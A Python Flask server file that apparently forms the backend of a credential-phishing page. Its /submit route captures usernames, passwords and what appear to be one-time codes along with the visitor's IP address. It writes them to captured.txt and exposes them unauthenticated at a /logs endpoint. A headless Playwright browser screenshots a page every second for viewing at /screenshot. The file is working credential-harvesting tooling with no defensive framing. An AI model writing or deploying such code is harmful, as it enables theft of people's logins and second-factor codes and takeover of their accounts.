import os
import threading
import time
from flask import Flask, render_template, request, jsonify
from playwright.sync_api import sync_playwright
from datetime import datetime

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)

creds_log = []

def screenshot_loop():
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(args=['--no-sandbox', '--disable-setuid-sandbox'])
            page = browser.new_page(viewport={'width': 1280, 'height': 720})
            page.goto('about:blank')
            while True:
                try:
                    path = os.path.join(STATIC_DIR, 'screenshot.png')
                    page.screenshot(path=path, full_page=False)
                except Exception as e:
                    print(f"screenshot error: {e}")
                time.sleep(1)
    except Exception as e:
        print(f"playwright init failed: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    entry = {
        'user': data.get('username'),
        'pass': data.get('password'),
        'code': data.get('code'),
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured.txt')
    with open(log_path, 'a') as f:
        f.write(f"{entry}\n")
    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    return jsonify(creds_log)

@app.route('/screenshot')
def screenshot():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    if os.path.exists(path):
        return app.send_static_file('screenshot.png')
    return '', 404

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
